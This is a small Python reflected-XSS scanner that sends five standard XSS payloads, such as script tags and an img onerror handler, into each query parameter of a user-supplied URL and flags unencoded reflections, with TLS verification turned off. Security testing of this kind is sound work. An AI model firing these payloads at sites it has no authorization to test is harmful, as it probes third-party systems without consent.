import sys
from urllib.parse import parse_qs, urlencode, urlparse
import requests

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()    
# XSS Payloads with unique markers to verify reflection
PAYLOADS = [                                        "<script>alert('XSS')</script>",
    '"><script>alert(1)</script>',
    '"><img src=x onerror=alert(1)>',
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
]                                               

def scan_xss(url):
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)

    if not params:
        print("[!] No URL parameters found! (Example needed: ?q=test or ?search=item)")
        return

    headers = {"User-Agent": "Ammar-XSS-Scanner/1.0"}

    print("\n" + "=" * 60)
    print(f"[*] Starting Reflected XSS Scan on Target: {url}")
    print("=" * 60 + "\n")

    vulnerable = False

    for param_name in params:
        print(f"[*] Testing Parameter: [{param_name}]")

        for payload in PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = payload

            query_string = urlencode(test_params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"

            try:
                response = requests.get(
                    test_url, headers=headers, timeout=5, verify=False
                )

                # Check if payload is reflected in response body without encoding
                if payload in response.text:
                    print(
                        f"[🔥] VULNERABLE! [Reflected XSS] via parameter '{param_name}'"
                    )
                    print(f"    Payload Reflected: {payload}")
                    print(f"    Test URL: {test_url}\n")
                    vulnerable = True
                    break

            except requests.RequestException:
                continue

    if not vulnerable:
        print("\n[-] No Reflected XSS vulnerabilities detected.")


def main():
    print("=== Automated Reflected XSS Scanner ===")
    url = input(
        "Enter Full URL (e.g. http://testphp.vulnweb.com/search.php?test=query): "
    ).strip()

    if url:
        scan_xss(url)
    else:
        print("[!] URL cannot be empty.")


if __name__ == "__main__":
    main()